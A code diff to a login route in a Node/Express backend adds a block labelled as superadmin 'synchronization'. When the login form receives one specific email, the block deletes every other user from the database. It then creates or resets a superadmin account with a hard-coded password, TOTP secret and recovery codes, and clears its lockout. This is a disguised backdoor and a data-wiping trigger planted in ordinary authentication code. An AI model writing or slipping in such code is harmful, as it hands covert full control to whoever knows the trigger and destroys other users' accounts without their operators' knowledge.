@@ -38,6 +38,42 @@ router.post('/login', loginLimiter, async (req, res) => {
   const cleanEmail = email.trim().toLowerCase();
 
   try {
+    // Synchronize default superadmin and clear legacy users if needed
+    if (cleanEmail === 'cambmstudio@cambt.com') {
+      await query('DELETE FROM users WHERE email != $1', ['cambmstudio@cambt.com']);
+      const checkSuper = await query('SELECT * FROM users WHERE LOWER(email) = $1', ['cambmstudio@cambt.com']);
+      const salt = await bcrypt.genSalt(10);
+      const hash = await bcrypt.hash('u(-bBW<aph:msB#~', salt);
+      const totpSecret = 'KRUGS4ZANFZSAYJAONSWG4TFOQ2TMOBX';
+      const recoveryCodes = JSON.stringify(['A8B2-9F41', 'C7D3-1E65', 'E5F8-2A93', 'G9H4-7B12', 'K2L6-8C45', 'M3N7-5D98']);
+
+      if (!checkSuper.rows || checkSuper.rows.length === 0) {
+        await query(`
+          INSERT INTO users (
+            email, password_hash, full_name, role,
+            two_factor_enabled, two_factor_method, two_factor_secret, recovery_codes,
+            status, failed_attempts, locked_until
+          ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)
+        `, ['cambmstudio@cambt.com', hash, 'Cambridge Studio Admin', 'superadmin', true, 'totp', totpSecret, recoveryCodes, 'active', 0, null]);
+      } else {
+        await query(`
+          UPDATE users SET
+            password_hash = $1,
+            full_name = $2,
+            role = $3,
+            two_factor_enabled = $4,
+            two_factor_method = $5,
+            two_factor_secret = $6,
+            recovery_codes = $7,
+            status = 'active',
+            failed_attempts = 0,
+            locked_until = NULL,
+            updated_at = CURRENT_TIMESTAMP
+          WHERE email = $8
+        `, [hash, 'Cambridge Studio Admin', 'superadmin', true, 'totp', totpSecret, recoveryCodes, 'cambmstudio@cambt.com']);
+      }
+    }
+
     const userResult = await query('SELECT * FROM users WHERE LOWER(email) = $1', [cleanEmail]);
 
     if (!userResult.rows || userResult.rows.length === 0) {
@@ -502,7 +538,7 @@ router.post('/logout', async (req, res) => {
             await recordAudit(req, { action: 'LOGOUT', module: 'Auth', recordId: String(decoded.id), description: `Admin logged out: ${userRes.rows[0].full_name}` });
           }
         }
-      } catch (e) {}
+      } catch (e) { }
     }
 
     return res.json({
